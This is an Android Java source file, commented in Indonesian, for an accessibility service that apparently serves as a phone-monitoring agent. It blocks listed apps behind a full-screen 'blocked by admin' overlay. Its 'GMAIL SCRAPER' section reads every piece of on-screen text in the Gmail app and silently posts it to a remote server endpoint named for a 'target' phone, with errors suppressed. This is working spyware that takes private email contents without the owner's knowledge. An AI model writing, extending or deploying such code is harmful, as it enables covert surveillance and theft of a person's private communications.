package com.ezax.agent;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.CountDownTimer;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class JaxAccessibilityService extends AccessibilityService {
    private static final String SERVER_URL = "http://192.168.1.25:5000"; // SESUAIKAN IP
    private Set<String> blockedApps = new HashSet<>();
    private int blockTimerMinutes = 0;
    private String lastScrapedText = "";
    
    private WindowManager windowManager;
    private View blockOverlay;
    private TextView tvTimer;
    private CountDownTimer countDownTimer;

    private BroadcastReceiver updateReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            loadBlockData();
            if (blockOverlay != null && blockedApps.isEmpty()) {
                hideBlockOverlay();
            }
        }
    };

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        registerReceiver(updateReceiver, new IntentFilter("UPDATE_BLOCK_LIST"));
        loadBlockData();
    }

    private void loadBlockData() {
        SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
        String blockedString = prefs.getString("blocked_apps", "");
        blockTimerMinutes = prefs.getInt("block_timer", 0);
        
        blockedApps.clear();
        if (!blockedString.isEmpty()) {
            for (String app : blockedString.split(",")) {
                if(!app.trim().isEmpty()) blockedApps.add(app.trim());
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String packageName = event.getPackageName().toString();
        
        // 1. APP BLOCKER
        if (blockedApps.contains(packageName)) {
            if (blockOverlay == null) {
                showBlockOverlay();
            }
        } else {
            // Kalau pindah ke app lain (misal pencet Home), overlay hilang
            if (blockOverlay != null) {
                hideBlockOverlay();
            }
        }

        // 2. GMAIL SCRAPER
        if (packageName.equals("com.google.android.gm")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                StringBuilder sb = new StringBuilder();
                extractText(root, sb);
                String finalText = sb.toString().trim();
                if (finalText.length() > 30 && !finalText.equals(lastScrapedText)) {
                    lastScrapedText = finalText;
                    kirimKeWeb("gmail", finalText);
                }
            }
        }
    }

    private void showBlockOverlay() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFFAA0000); // Merah Gelap

        TextView title = new TextView(this);
        title.setText("🚫 AKSES DIBLOKIR\nOLEH ADMIN\n\n");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(28f);
        title.setGravity(Gravity.CENTER);
        
        tvTimer = new TextView(this);
        tvTimer.setTextColor(0xFFFFFF00); // Kuning
        tvTimer.setTextSize(22f);
        tvTimer.setGravity(Gravity.CENTER);

        layout.addView(title);
        layout.addView(tvTimer);

        int layoutFlag = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                WindowManager.LayoutParams.TYPE_PHONE;

        // FLAG_NOT_FOCUSABLE = Bikin tombol Home/Back/Recent tetap berfungsi
        // FLAG_LAYOUT_IN_SCREEN = Nutupin seluruh layar
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        
        windowManager.addView(layout, params);
        blockOverlay = layout;

        startTimer();
    }

    private void startTimer() {
        if (blockTimerMinutes == 0) {
            tvTimer.setText("STATUS: PERMANEN");
            return;
        }

        if (countDownTimer != null) countDownTimer.cancel();
        
        long duration = blockTimerMinutes * 60 * 1000L;
        countDownTimer = new CountDownTimer(duration, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                long mins = millisUntilFinished / 60000;
                long secs = (millisUntilFinished % 60000) / 1000;
                tvTimer.setText(String.format("Sisa Waktu: %02d:%02d", mins, secs));
            }
            @Override
            public void onFinish() {
                // Timer habis, hapus dari blocklist
                SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
                prefs.edit().putString("blocked_apps", "").apply();
                hideBlockOverlay();
            }
        }.start();
    }

    private void hideBlockOverlay() {
        if (countDownTimer != null) countDownTimer.cancel();
        if (blockOverlay != null) {
            try { windowManager.removeView(blockOverlay); } catch (Exception e) {}
            blockOverlay = null;
        }
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) sb.append(node.getText().toString()).append("\n");
        for (int i = 0; i < node.getChildCount(); i++) extractText(node.getChild(i), sb);
    }

    private void kirimKeWeb(String type, String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/upload_result/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", text);
                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes("utf-8")); }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    @Override
    public void onInterrupt() { }
}
